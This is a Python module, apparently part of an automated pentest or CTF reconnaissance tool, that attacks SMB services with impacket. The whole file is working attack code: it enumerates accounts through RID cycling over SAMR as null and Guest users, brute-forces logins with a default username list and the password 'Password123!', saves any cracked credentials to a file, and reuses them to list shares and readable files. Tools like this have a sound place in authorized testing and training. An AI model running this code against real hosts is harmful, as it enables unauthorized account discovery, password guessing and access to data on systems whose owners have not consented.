import subprocess
import re
from mods.mod_utils import *
import os
from impacket.dcerpc.v5 import transport, samr
from impacket.smbconnection import SMBConnection
from impacket.smb import SMB_DIALECT
import socket

smb_users = ["admin","user","manager","supervisor","administrator","test","operator","backup","lab","demo","smb"]
original_users_len = len(smb_users)
smb_passwords = ["Password123!"]
domain = '.'
credentials = []


def export_wordlists(_smb_users, _smb_paswords):
    with open('smb_users.txt', 'w') as file:
        file.write('\n'.join(_smb_users))
        file.close()
    
    with open('smb_pass.txt', 'w') as file:
        file.write('\n'.join(_smb_paswords))
        file.close()


def export_credentials():
    with open('smb_credentials.txt', 'w') as file:
        file.write('\n'.join(credentials))
        file.close()
        printc('[+] Credentials stored in smb_credentials.txt', GREEN)


def rid_cycling(target, user="Guest", passw="", domain="."):
    try:
        # Setup connection
        rpctransport = transport.SMBTransport(target, 445, r'\samr', username=user, password=passw, domain=domain)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        
        # Open SAMR connection
        resp = samr.hSamrConnect(dce)
        server_handle = resp['ServerHandle']
        
        # Enumerate domains
        resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
        domains = resp['Buffer']['Buffer']
        
        temp_users = []
        
        for domain in domains:
            print(f'[+] Found domain: {domain["Name"]}')
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain['Name'])
            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=resp['DomainId'])
            domain_handle = resp['DomainHandle']
            
            # RID cycling
            for rid in range(500, 5000):
                try:
                    resp = samr.hSamrOpenUser(dce, domain_handle, rid)
                    resp = samr.hSamrQueryInformationUser2(dce, resp['UserHandle'])
                    user = resp['Buffer']['AccountName']
                    printc(f'[+] {user}', BLUE)
                    temp_users.append(user)
                except:
                    pass
                    
        if len(temp_users) > 0:
            global smb_users
            smb_users += temp_users
            smb_users = list(set(smb_users))
            export_wordlists(smb_users, smb_passwords)
            
    except Exception as e:
        printc(f'[-] {e}', RED)
        return


def bruteforce(target, port):
    global credentials
    
    for user in smb_users:
        for password in smb_passwords:
            try:
                conn = SMBConnection(target, target, sess_port=port)
                conn.login(user, password, domain)
                creds = f"{user}:{password}"
                printc(f'[+] {creds}', BLUE)
                credentials.append(creds)
                conn.close()
            except Exception:
                pass
                
    if credentials:
        export_credentials()


def enumerate_shares(target, user='Guest', passw='', domain='.'):
    try:
        conn = SMBConnection(target, target)
        conn.login(user, passw, domain)
        
        shares = conn.listShares()
        print_banner('445')
        print(f'[!] Enumerating shares as {user}')
        print('')
        
        for share in shares:
            print(f'[+] Found share: {share["shi1_netname"]}')
            try:
                files = conn.listPath(share['shi1_netname'], '/*')
                print(f'    Access: READ')
                for file in files:
                    print(f'    {file.get_longname()}')
            except:
                print(f'    Access: NO READ')
                
        conn.close()
        
    except Exception as e:
        printc(f'[-] {e}', RED)
        return


def handle_smb(target, port):
    #printc('smb', RED)
    
    if not os.path.exists('smb_credentials.txt'):
        # RID CYCLING AS NULL
        rid_cycling(target, user='')
        # RID CYCLING AS GUEST
        rid_cycling(target)
        # If no usernames where founded, bruteforce with common users and pass
        export_wordlists(smb_users, smb_passwords)
        # BRUTEFORCE LOGIN
        bruteforce(target, port)

        # ENUMERATE SHARES
        # SHARES AS GUEST
        enumerate_shares(target)
        # SHARES AS NULL
        enumerate_shares(target, user='')

    if os.path.exists('smb_credentials.txt'):
        global credentials
        with open('smb_credentials.txt', 'r') as file:
            credentials = file.readlines()
        cred = ''
        if (len(credentials)>0):
            for cred in credentials:
                if ('Guest' not in cred) and (':' in cred):
                    user, passw = cred.split(':')[:2]
                    # RID CYCLING WITH CREDS
                    rid_cycling(target, user, passw, domain)
                    # SHARES WITH CREDS
                    enumerate_shares(target, user, passw, domain)

    try:
        os.remove('smb_users.txt')
        os.remove('smb_pass.txt')
        if not credentials:
            os.remove('smb_credentials.txt')
    except Exception as e:
        pass
        #printc(f'[-] {e}', RED)